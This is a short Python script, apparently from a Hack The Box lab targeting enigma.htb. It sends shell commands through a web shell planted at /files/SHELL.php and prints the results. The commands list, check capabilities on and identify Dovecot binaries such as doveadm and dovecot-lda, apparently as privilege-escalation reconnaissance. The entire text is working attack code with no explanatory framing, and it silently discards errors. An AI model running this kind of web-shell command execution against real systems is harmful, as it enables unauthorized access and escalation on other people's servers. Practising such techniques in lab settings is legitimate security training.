import urllib.request, urllib.parse

cmds = [
    "ls -la /usr/bin/doveadm /usr/lib/dovecot/deliver /usr/lib/dovecot/dovecot-lda /usr/lib/dovecot/script /usr/lib/dovecot/script-login /usr/lib/dovecot/maildirlock 2>&1",
    "getcap /usr/bin/doveadm /usr/lib/dovecot/deliver /usr/lib/dovecot/dovecot-lda 2>&1",
    "file /usr/bin/doveadm /usr/lib/dovecot/deliver /usr/lib/dovecot/dovecot-lda 2>&1",
]

for cmd in cmds:
    url = "http://10.129.26.34/files/SHELL.php?" + urllib.parse.urlencode({"c": cmd})
    headers = {"Host": "support_001.enigma.htb"}
    req = urllib.request.Request(url, headers=headers)
    try:
        resp = urllib.request.urlopen(req, timeout=10)
        result = resp.read().decode("utf-8", errors="replace").strip()
        if result:
            print(f"=== {cmd[:60]} ===")
            print(result[:2000])
            print()
    except Exception as e:
        pass
